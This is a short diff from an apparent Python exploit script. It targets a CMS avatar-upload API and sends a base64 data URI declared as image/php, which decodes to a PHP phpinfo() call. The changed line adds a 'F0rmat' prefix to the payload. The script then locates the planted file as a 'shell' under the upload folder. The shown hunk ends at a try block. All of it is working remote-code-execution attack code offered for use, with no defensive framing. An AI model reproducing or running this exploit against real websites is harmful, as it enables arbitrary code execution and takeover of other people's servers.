@@ -8,7 +8,7 @@ import threading
 def exploit(target):
     if sys.argv[1]== "-f":
         target=target[0]
-    payload = "/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+"
+    payload = "/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,RjBybWF0PD9waHAgcGhwaW5mbygpOz8+"
     url = target+payload
     shell = target+'/uploadfile/member/0/0x0.php'
     try:
